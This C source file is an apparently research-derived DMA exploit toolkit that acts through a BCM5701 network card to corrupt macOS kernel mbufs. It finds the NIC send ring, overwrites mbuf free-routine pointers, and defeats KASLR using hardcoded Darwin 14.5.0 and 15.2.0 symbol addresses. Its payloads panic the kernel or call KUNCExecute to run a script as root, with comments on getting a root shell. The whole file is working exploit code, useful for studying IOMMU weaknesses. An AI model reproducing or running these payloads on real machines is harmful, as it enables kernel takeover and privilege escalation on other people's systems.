/** Attack functions for the BCM5701 driver. */


#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "baremetalsupport.h"

#include "iownmmu/BCM5701/mbuf.h"
#include "iownmmu/rw.h"
#include "iownmmu/iownmmu.h"
#include "iownmmu/util.h"

/** FRAMEWORK FUNCTIONS */


/**
 * Process heuristic for use with iovirtual_window_explorer that uses the known
 * layout of a BCM5701's send buffer descriptor to look for a page containing
 * the NIC's send buffer descriptor ring. See the BCM57785 Programmer's Reference Guide
 * page 73 for information about send buffer descriptors.
 *
 * Note: the page containing the send buffer descriptor ring seems to grow as
 * the uptime of the machine. We choose to check for only 16 entries because
 * doing so doesn't seem to give false positives and the ring seems to be that
 * large very shortly after boot.
 *
 * Parameters:
 *  mem: pointer to a page of memory
 *  page_ioaddr: the virtual io address of the page pointed to by mem
 *
 * Returns:
 *  page_ioaddr if the page contains the NIC's send buffer descriptor ring, 0 otherwise
 */
uint64_t BCM5701_sendring_process(void *mem, uint64_t page_ioaddr, uint64_t unused) {
  uint64_t *page = (uint64_t *)mem;

  // for each 16 byte send buffer descriptor, the lower 4 bytes of
  // the IO virtual address should be 00, the first byte of
  // the IO virtual address should be 08, and all bytes of
  // the VLAN tag should be 00
  for (int32_t i = 0; i < 16; i++) {
    if (((page[2 * i] & 0xffffffff) != 0) ||
        ((page[2 * i] & 0xff00000000000000) != 0x0800000000000000) ||
        ((page[(2 * i) + 1] & 0xffffffff00000000) != 0)) {
      return 0;
    }
  }

  printf("Window: 0x");
  write_uint_64_hex(page_ioaddr, '0');
  printf("...\n");
  return page_ioaddr;
}


/**
 * Given the IO virtual address of a page containing mbufs, iterate over
 * the mbufs and execute the exploit payload on appropriate mbufs until
 * a certain number have been exploited or a certain number of pages has
 * been exhausted.
 *
 * Parameters:
 *  page_addr: the IO virtual adress of a page containing mbufs
 *  num_pages: the number of pages to iterate over - if this is 0, no limit
 *  num_mbufs: the number of mbufs to modify - if this is 0, no limit
 *  payload: the exploit payload function that takes in an mbuf and modifies it
 *
 * Returns:
 *  the number of modified mbufs
 */
uint32_t modify_mbufs(uint64_t page_addr, uint32_t num_pages, uint32_t num_mbufs,
    void (*payload)(struct mbuf *)) {
  uint32_t num_modified = 0;

  uint64_t mbuf_addr = page_addr;
  while (((num_pages == 0) || (mbuf_addr < (page_addr + (num_pages * 0x1000)))) &&
         ((num_mbufs == 0) || (num_modified < num_mbufs))) {
    printf("Reading mbuf: ");
    write_uint_64_hex(mbuf_addr, '0');
    printf("...\n");

    struct mbuf mb;
    int32_t status = read_buffer(mbuf_addr, sizeof(struct mbuf), &mb);
    if (status != 0) {
      printf("Bad read...\n");
      mbuf_addr += sizeof(struct mbuf);
      continue;
    }

    // skip mbufs that are free or don't have external storage -
    // mbufs without external storage will not work (see mbuf_prime)
    if (((mb.m_flags & M_EXT) != M_EXT) || (mb.m_type == MT_FREE)) {
      mbuf_addr += sizeof(struct mbuf);
      continue;
    }

    // execute payload to modify the mbuf
    payload(&mb);

    // write the modified mbuf back
    write_buffer(mbuf_addr, sizeof(struct mbuf), &mb);

    printf("Modified...\n");
    num_modified++;
    mbuf_addr += sizeof(struct mbuf);
  }

  return num_modified;
}


/**
 * Function to execute a BCM5701 mbuf-based exploit. It finds the
 * send descriptor ring then uses the IO virtual pointers therein to
 * find pages containing mbufs. It modifies the mbufs according to
 * the exploit payload.
 *
 * Parameters:
 *  num_mbufs: the number of mbufs to modify
 *  payload: the payload function to modify the mbufs
 */
void BCM5701_own(uint32_t num_mbufs, void (*payload)(struct mbuf *)) {
  printf("Finding send descriptor ring window...\n");
  uint64_t iommu_window = iovirtual_window_explorer(0x400000, 0,
      BCM5701_sendring_process, 0);

  // the mapping opened for the send descriptor ring is 0x2000 bytes
  uint8_t sendring[0x2000];
  int32_t status = read_buffer(iommu_window, sizeof(sendring), sendring);
  if (status != 0) {
    printf("Bad read...\n");
    return;
  }

  uint64_t descriptor_pointer = 0;
  uint32_t i, modified_mbufs = 0;
  while ((i < sizeof(sendring)) && ((num_mbufs == 0) || (modified_mbufs < num_mbufs))) {
    // buffer descriptor pointers are 16 byte aligned - see the
    // BCM57785 Programmer's Reference Guide, page 73
    descriptor_pointer = *(uint64_t *)(&sendring[i]);

    // the pointers are located in the higher four bytes
    // and point to the virtual IO address that the NIC
    // should read data from (i.e. an mbuf or external
    // storage)
    descriptor_pointer >>= 32;

    // descriptor pointers with offset less than 0x20
    // would point into an mbuf header so must point
    // to external storage - the rest seem to point
    // into mbufs
    if ((descriptor_pointer & 0xff) <= 0x20) {
      i += 0x10;
      continue;
    }

    printf("Read buffer descriptor ptr: ");
    write_uint_64_hex(descriptor_pointer, '0');
    printf("...\n");

    descriptor_pointer &= ~0xfff;

    // search through the page containing multiple mbufs
    // and make modifications
    uint32_t modify_param = 0;
    if (num_mbufs == 0) {
      modify_param = 0;
    } else {
      modify_param = num_mbufs - modified_mbufs;
    }
    modified_mbufs += modify_mbufs(descriptor_pointer, 1, modify_param, payload);

    i += 0x10;
  }
}


/** MBUF FUNCTIONS */


/** Offset for overwritable space in an mbuf with external storage */
#define MBUF_EXT_OFFSET sizeof(struct m_hdr) + sizeof(struct pkthdr) + sizeof(m_ext_t)

/** Offset for overwriteable space in a primed mbuf */
#define MBUF_PRIMED_OFFSET MBUF_EXT_OFFSET + 8

/**
 * Prime an mbuf for its free routine and arguments to be overwritten. This function
 * should be called in a payload function before mbuf_inject and must be called for
 * the mbuf injection to work correctly. After this function is called, 8 bytes
 * of data will be inserted into the mbuf after the m_ext section so that the payload
 * function has 24 bytes left of the mbuf to use.
 *
 * Parameters:
 *  mb: pointer to an mbuf
 *
 * Returns:
 *  the address of the start of the mbuf in kernel virtual memory - payload functions
 *  should use this for their exploits just in case we need to change the way it's
 *  calculated
 */
uint64_t mbuf_prime(struct mbuf *mb) {
  // this 8 byte field represents an ext_ref struct with refcnt 1 and flags 0 -
  // such an ext_ref (particularly with flags 0) is necessary for our custom free
  // routine to be called without kernel panic (see m_free() of bsd/kern/uipc_mbuf.c)
  *((uint64_t *)((uint8_t *)mb + MBUF_EXT_OFFSET)) = 0x1;

  // m_ext.ext_refs.forward seems to always point to itself in the kernel virtual
  // address space for mbufs with external storage - use this information to
  // obtain a pointer to the start of the mbuf in the kernel virtual address space
  uint64_t mbuf_kern_ptr = mb->m_ext.ext_refs.forward & ~0xff;

  // set m_ext.ext_refflags to the kernel virtual address of the ext_ref struct
  // we created above so that it will be used in processing this mbuf
  mb->m_ext.ext_refflags = mbuf_kern_ptr + MBUF_EXT_OFFSET;

  return mbuf_kern_ptr;
}


/**
 * Overwrite an mbuf's free routine and the first three arguments to that
 * routine. This will also modify the mbuf's buf pointer and size. This function
 * should be called in a payload function after mbuf_prime.
 *
 * Parameters:
 *  mb: pointer to an mbuf
 *  function_kaddr: the kernel virtual address of a function
 *  arg1: the first argument passed into the function pointed to
 *    by function_kaddr when the mbuf is freed
 *  arg2: the second argument to the function
 *  arg3: the third argument to the function
 */
void mbuf_inject(struct mbuf *mb, uint64_t function_kaddr, uint64_t arg1,
    uint64_t arg2, uint64_t arg3) {
  mb->m_ext.ext_free = function_kaddr;
  mb->m_ext.ext_buf = arg1;
  mb->m_ext.ext_size = arg2;
  mb->m_ext.ext_arg = arg3;
}


/**
 * Given a pointer to an mbuf with external data, print relevant
 * information about it.
 *
 * Parameters:
 *  mb: a pointer to an mbuf with external data (NIOS address space)
 */
void mbuf_print(struct mbuf *mb) {
  printf("next 0x");
  write_uint_64_hex(mb->m_next, '0');
  printf("\n");
  printf("nextpkt 0x");
  write_uint_64_hex(mb->m_nextpkt, '0');
  printf("\n");
  printf("data 0x");
  write_uint_64_hex(mb->m_data, '0');
  printf("\n");
  printf("len 0x");
  write_uint_64_hex(mb->m_len, '0');
  printf("\n");
  printf("flags 0x");
  write_uint_64_hex(mb->m_flags, '0');
  printf("\n");
  printf("type 0x");
  write_uint_64_hex(mb->m_type, '0');
  printf("\n");
  printf("ext.buf 0x");
  write_uint_64_hex(mb->m_ext.ext_buf, '0');
  printf("\n");
  printf("ext.free 0x");
  write_uint_64_hex(mb->m_ext.ext_free, '0');
  printf("\n");
  printf("ext.size 0x");
  write_uint_64_hex(mb->m_ext.ext_size, '0');
  printf("\n");
  printf("ext.arg 0x");
  write_uint_64_hex(mb->m_ext.ext_arg, '0');
  printf("\n");
  printf("ext.refsq.forward 0x");
  write_uint_64_hex(mb->m_ext.ext_refs.forward, '0');
  printf("\n");
  printf("ext.refsq.backward 0x");
  write_uint_64_hex(mb->m_ext.ext_refs.backward, '0');
  printf("\n");
  printf("ext.refflags 0x");
  write_uint_64_hex(mb->m_ext.ext_refflags, '0');
  printf("\n");
}


/** PAYLOAD FUNCTIONS */


/**
 * BCM5701 mbuf-based exploit payload that calls panic with arguments we control.
 * Proof of concept exploit. In general, a payload takes in a pointer to an mbuf and
 * modifies its free routine/arguments by making use of mbuf_prime() and mbuf_inject().
 * Works for Darwin kernel version 15.2.0 (El Capitan).
 *
 * Parameters:
 *  mb: pointer to an mbuf
 */
void panic_15_2_0(struct mbuf *mb) {
  static uint64_t slide = 0;
  if (slide == 0) {
    // use the known static kernel address of gIOBMDPageAllocator (from Darwin 15.2.0) + 8,
    // whose shifted kernel address should be exposed to IO virtual space by USB and
    // AHCI drivers, to find the KASLR slide - find the address of symbols by calling
    // nm on the kernel binary
    const uint64_t gIOBMDPageAllocator_STATIC_KADDR = 0xffffff8000b28398;
    printf("Finding KASLR slide...\n");
    slide = iovirtual_window_explorer(0x4c0000, 0,
        kaslr_slide_symbol_process, gIOBMDPageAllocator_STATIC_KADDR);
  }

  // the static kernel address of panic from Darwin 15.2.0
  const uint64_t PANIC_STATIC_KADDR = 0xffffff80002de6b0;

  uint64_t mbuf_kern_ptr = mbuf_prime(mb);

  // set up the format string "%x %x" at the next available 8 byte chunk after priming
  *(uint64_t *)((char *)mb + MBUF_PRIMED_OFFSET) = 0x0000007825207825;

  mbuf_inject(mb, PANIC_STATIC_KADDR + slide, mbuf_kern_ptr + MBUF_PRIMED_OFFSET,
      0x1337, 0xdeadbeef);
}


/**
 * Same idea as the panic payload for 15.2.0 but prints to dmesg console. Should not
 * crash the kernel.
 *
 * Parameters:
 *  mb: pointer to an mbuf
 */
void printf_15_2_0(struct mbuf *mb) {
  static uint64_t slide = 0;
  if (slide == 0) {
    // use the known static kernel address of gIOBMDPageAllocator (from Darwin 15.2.0) + 8,
    // whose shifted kernel address should be exposed to IO virtual space by USB and
    // AHCI drivers, to find the KASLR slide - find the address of symbols by calling
    // nm on the kernel binary
    const uint64_t gIOBMDPageAllocator_STATIC_KADDR = 0xffffff8000b28398;
    printf("Finding KASLR slide...\n");
    slide = iovirtual_window_explorer(0x4c0000, 0,
        kaslr_slide_symbol_process, gIOBMDPageAllocator_STATIC_KADDR);
  }

  // the static kernel address of printf from Darwin 15.2.0
  const uint64_t PRINTF_STATIC_KADDR = 0xffffff80002ee210;

  uint64_t mbuf_kern_ptr = mbuf_prime(mb);

  // set up the format string "%x %x" at the next available 8 byte chunk after priming
  *(uint64_t *)((char *)mb + MBUF_PRIMED_OFFSET) = 0x0000007825207825;

  mbuf_inject(mb, PRINTF_STATIC_KADDR + slide, mbuf_kern_ptr + MBUF_PRIMED_OFFSET,
      0x1337, 0xdeadbeef);
}


/**
 * Darwin 15.2.0 payload that calls KUNCExecute, a deprecated kernel function that
 * takes in a path to an executable, a pid, and a gid, and runs the executable as the
 * user specified by the pid/gid combination. To take advantage of this exploit, create
 * a bash script (THAT MUST START WITH #!/bin/bash) at /tmp/iownmmu. When the payload is
 * run, that script will be run as root. MAKE SURE THE SCRIPT IS EXECUTABLE!
 *
 * If you call the Terminal.app binary in this way, which is a useful way to get a root
 * shell, you may need to click the Terminal icon in the dock then Apple-N to get a new
 * window.
 *
 * Parameters:
 *  mb: pointer to an mbuf
 */
void root_execute_15_2_0(struct mbuf *mb) {
  static uint64_t slide = 0;
  if (slide == 0) {
    // use the known static kernel address of gIOBMDPageAllocator (from Darwin 15.2.0) + 8,
    // whose shifted kernel address should be exposed to IO virtual space by USB and
    // AHCI drivers, to find the KASLR slide - find the address of symbols by calling
    // nm on the kernel binary
    const uint64_t gIOBMDPageAllocator_STATIC_KADDR = 0xffffff8000b28398;
    printf("Finding KASLR slide...\n");
    slide = iovirtual_window_explorer(0x4c0000, 0,
        kaslr_slide_symbol_process, gIOBMDPageAllocator_STATIC_KADDR);
  }

  // the static kernel address of KUNCExecute from Darwin 15.2.0
  const uint64_t KUNCExecute_STATIC_ADDR = 0xffffff80002b7530;

  uint64_t mbuf_kern_ptr = mbuf_prime(mb);

  strcpy(((char *)mb + MBUF_PRIMED_OFFSET), "/tmp/iownmmu");

  mbuf_inject(mb, KUNCExecute_STATIC_ADDR + slide, mbuf_kern_ptr + MBUF_PRIMED_OFFSET, 0, 0);
}


/**
 * Panic payload for Darwin kernel version 14.5.0 (Yosemite)
 *
 * Parameters:
 *  mb: pointer to an mbuf
 */
void panic_14_5_0(struct mbuf *mb) {
  static uint64_t slide = 0;
  if (slide == 0) {
    // use the known static kernel address of gIOBMDPageAllocator (from Darwin 14.5.0) + 8,
    // whose shifted kernel address should be exposed to IO virtual space by USB and
    // AHCI drivers, to find the KASLR slide
    const uint64_t gIOBMDPageAllocator_STATIC_KADDR = 0xffffff8000b13f88;
    printf("Finding KASLR slide...\n");
    slide = iovirtual_window_explorer(0x4c0000, 0,
        kaslr_slide_symbol_process, gIOBMDPageAllocator_STATIC_KADDR);
  }

  // the static kernel address of panic from Darwin 14.5.0
  const uint64_t PANIC_STATIC_KADDR = 0xffffff800032ac50;
  uint64_t mbuf_kern_ptr = mbuf_prime(mb);

  // set up the format string "%x %x" at the next available 8 byte chunk after priming
  *(uint64_t *)((char *)mb + MBUF_PRIMED_OFFSET) = 0x0000007825207825;

  mbuf_inject(mb, PANIC_STATIC_KADDR + slide, mbuf_kern_ptr + MBUF_PRIMED_OFFSET,
      0x1337, 0xdeadbeef);
}
